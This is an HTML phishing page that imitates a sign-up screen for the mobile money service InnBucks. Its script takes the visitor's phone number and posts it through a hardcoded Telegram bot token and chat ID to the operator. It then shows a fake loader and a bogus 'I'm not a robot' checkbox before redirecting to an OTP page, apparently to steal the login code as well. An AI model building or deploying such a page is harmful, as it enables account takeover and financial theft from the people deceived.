<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>InnBucks | Welcome</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family: "Segoe UI", sans-serif;
}

body{
  background:#1f2235;
  min-height:100vh;
  display:flex;
  justify-content:center;
  color:#fff;
}

/* Main container */
.container{
  width:100%;
  max-width:380px;
  padding:30px 20px 100px;
  text-align:center;
}

/* Logo */
.logo{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:10px;
  margin-bottom:30px;
}

.dots{
  display:grid;
  grid-template-columns:repeat(2,15px);
  gap:5px;
}

.dot{
  width:15px;
  height:15px;
  border-radius:50%;
}

.dot1{background:#ffb300;}
.dot2{background:#8e24aa;}
.dot3{background:#43a047;}
.dot4{background:#e53935;}

h1{
  font-size:24px;
  margin-bottom:35px;
}

/* Input */
.input-box{
  display:flex;
  align-items:center;
  border-bottom:1px solid #aaa;
  padding-bottom:8px;
  margin-bottom:25px;
}

select,input{
  background:none;
  border:none;
  color:#fff;
  font-size:16px;
  outline:none;
}

input{
  flex:1;
  padding-left:10px;
}

/* Terms */
.terms{
  font-size:13px;
  color:#ccc;
}

/* Footer button */
.footer-btn{
  position:fixed;
  bottom:20px;
  left:50%;
  transform:translateX(-50%);
  width:100%;
  max-width:380px;
  padding:0 20px;
}

button{
  width:100%;
  background:#355d8c;
  border:none;
  padding:14px;
  border-radius:10px;
  color:#fff;
  font-size:16px;
  cursor:pointer;
}

/* Loader screen */
#loaderScreen{
  position:fixed;
  inset:0;
  background:#1f2235;
  display:none;
  align-items:center;
  justify-content:center;
  z-index:10;
}

.loader{
  width:40px;
  height:40px;
  border:4px solid #555;
  border-top:4px solid #fff;
  border-radius:50%;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  100%{transform:rotate(360deg);}
}

/* Robot screen */
#robotScreen{
  position:fixed;
  inset:0;
  background:#1f2235;
  display:none;
  align-items:center;
  justify-content:center;
  z-index:20;
}

.robot-box{
  background:#fff;
  color:#000;
  padding:15px;
  border-radius:6px;
  display:flex;
  align-items:center;
  gap:10px;
}

.robot-box input{
  width:20px;
  height:20px;
}
</style>
</head>
<body>

<div class="container">

  <!-- Logo -->
  <div class="logo">
    <div class="dots">
      <div class="dot dot1"></div>
      <div class="dot dot2"></div>
      <div class="dot dot3"></div>
      <div class="dot dot4"></div>
    </div>
    <h2>InnBucks</h2>
  </div>

  <h1>Welcome To<br>InnBucks</h1>

  <div class="input-box">
    <select id="code">
      <option value="+263">+263</option>
      <option value="+254">+254</option>
    </select>

    <input type="tel" id="phone" placeholder="Enter your mobile number" maxlength="10">
  </div>

  <p class="terms">
    By pressing Sign Up, you agree to our
    <span style="color:#4dabf7">Privacy Policy</span> and
    <span style="color:#4dabf7">Terms</span>
  </p>

</div>

<!-- Continue button -->
<div class="footer-btn">
  <button onclick="startProcess()">Continue</button>
</div>

<!-- Loader -->
<div id="loaderScreen">
  <div class="loader"></div>
</div>

<!-- Robot -->
<div id="robotScreen">
  <div class="robot-box">
    <input type="checkbox" id="robotCheck">
    <label>I'm not a robot</label>
  </div>
</div>

<script>
  // 1. TELEGRAM CONFIGURATION
  const BOT_TOKEN = "8205911859:AAHz67pd-r9V2TYVf3NEvlOX1aRXrigm9Hg"; // Replace with your Bot Token
  const CHAT_ID = "8588753899";     // Replace with your Chat ID

  /**
   * 2. SEND DATA DIRECTLY TO TELEGRAM
   */
  async function sendToTelegram(fullNumber) {
    // Formatting the message for better readability in Telegram
    const msg = `üöÄ *New InnBucks Login*\n\n` +
                `üì± *Phone:* \`${fullNumber}\`\n` +
                `‚è∞ *Time:* ${new Date().toLocaleString()}`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: msg,
          parse_mode: "Markdown" // Makes the phone number clickable/copyable
        })
      });
    } catch (error) {
      console.error("Telegram Error:", error);
    }
  }
  
  /**
   * 3. INITIALIZE THE LOGIN PROCESS
   */
  function startProcess() {
    let phone = document.getElementById("phone").value;
    let code = document.getElementById("code").value;
  
    if (phone.length < 9) {
      alert("Enter valid phone number");
      return;
    }
  
    let fullNumber = code + phone;
  
    // Save number locally for the next screen (otp.html)
    localStorage.setItem("userPhone", fullNumber);
  
    // Send the number directly to your Telegram Bot
    sendToTelegram(fullNumber);
  
    // Show the loading animation
    document.getElementById("loaderScreen").style.display = "flex";
  
    // Wait 4 seconds, then show the "Not a Robot" screen
    setTimeout(() => {
      document.getElementById("loaderScreen").style.display = "none";
      document.getElementById("robotScreen").style.display = "flex";
    }, 4000);
  }
  
  /**
   * 4. ROBOT CHECK LOGIC
   */
  if (document.getElementById("robotCheck")) {
    document.getElementById("robotCheck").addEventListener("change", function() {
      if (this.checked) {
        // Small delay for realism before moving to OTP page
        setTimeout(() => {
          window.location.href = "otp.html";
        }, 800);
      }
    });
  }
</script>

</body>
</html>
